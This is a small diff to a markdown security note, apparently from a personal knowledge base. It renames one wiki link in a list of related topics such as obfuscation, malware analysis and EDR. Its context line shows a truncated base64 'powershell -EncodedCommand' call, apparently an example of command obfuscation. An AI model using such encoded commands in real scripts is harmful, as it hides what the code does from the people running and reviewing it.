@@ -69,7 +69,7 @@ powershell -EncodedCommand aQBmACgAJABlAG4AdgA6ACUAdQBuAGkAcwBlAHIAbgBhAG0AZQApA
 
 - [[Obfuscation]]
 - [[Malware Analysis]]
-- [[Endpoint Detection and Response (EDR)]]
+- [[Endpoint Detection & Response (EDR)]]
 - [[Living off the Land Techniques]]
 - [[SIEM & Log Analysis]]
 - [[Red Team vs Blue Team]]
